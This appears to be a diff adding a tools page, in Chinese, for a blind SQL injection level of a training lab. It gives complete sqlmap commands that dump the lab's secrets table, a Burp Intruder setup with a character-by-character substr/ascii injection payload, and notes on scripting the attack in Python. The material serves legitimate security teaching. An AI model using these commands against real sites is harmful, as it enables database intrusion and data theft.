@@ -1,0 +1,47 @@
+<h4>sqlmap（自动化首选）</h4>
+<p>布尔盲注最省事的方式：让 sqlmap 自动完成长度探测、字符定位与导出。</p>
+<pre>
+# 只跑布尔盲注，导出通关凭证
+sqlmap -u "{{SITE}}/modules/sqli/blind.php?name=admin" --technique=B -D bafanglab -T secrets --dump --batch
+
+# 先看库 / 表
+sqlmap -u "{{SITE}}/modules/sqli/blind.php?name=admin" --technique=B --dbs --batch
+sqlmap -u "{{SITE}}/modules/sqli/blind.php?name=admin" --technique=B -D bafanglab --tables --batch
+
+# 常用参数
+# --technique=B   只跑布尔盲注（T 时间盲注）
+# --threads=4     并发，盲注提速明显（靶场可放心用）
+# --level=3 --risk=2  扩大测试范围
+# --string="存在"   用页面关键字判定真值（本关也可用）
+</pre>
+<p><b>本关解决什么：</b>把几十上百次手工请求交给工具，自动还原完整通关凭证。</p>
+
+<h4>Burp Suite Intruder</h4>
+<p>不想装 sqlmap 时，用 Intruder 批量猜字符，按响应长度或关键字过滤。</p>
+<pre>
+1. 抓 ?name=admin' and 1=1-- - 这条请求，Send to Intruder
+2. 攻击类型选 Cluster bomb（Pitchfork 亦可），把 substr 的位置和 ascii 值设为两个 payload 位置
+   例：?name=admin' and ascii(substr((select secret from secrets limit 1),§1§,1))=§32§-- -
+3. Payload 1：1-40（字符位置）；Payload 2：32-126（可打印 ASCII）
+4. Start attack，在结果里按 Length 或 Grep 关键字 "var(--success)" 排序，命中的那一行就是正确字符
+</pre>
+<p><b>本关解决什么：</b>可视化地逐位爆破，直观看到"真/假"两种响应的差异。</p>
+
+<h4>浏览器 DevTools</h4>
+<ul>
+<li>地址栏手改 payload，观察页面在"存在 / 不存在 / 查询异常"之间切换，先手工确认思路。</li>
+<li>F12 &rarr; Network 对比两次请求的 Response 大小与内容，确定用什么做判定特征。</li>
+<li>用无痕窗口排除缓存与登录态干扰。</li>
+</ul>
+<p><b>本关解决什么：</b>零成本验证注入点与判定特征，再决定交给哪种自动化工具。</p>
+
+<h4>Python + requests</h4>
+<p>最灵活：可自己实现二分查找、断点续跑、并发请求。</p>
+<pre>
+# 安装依赖
+pip install requests
+
+# 思路：外层循环字符位置，内层循环 ascii 值；命中 var(--success) 即为真
+# 完整示例见本关「提示」页中的脚本，可直接复制运行
+</pre>
+<p><b>本关解决什么：</b>按自己的节奏控制请求频率，避免触发限速，也便于记录已猜出的字符。</p>
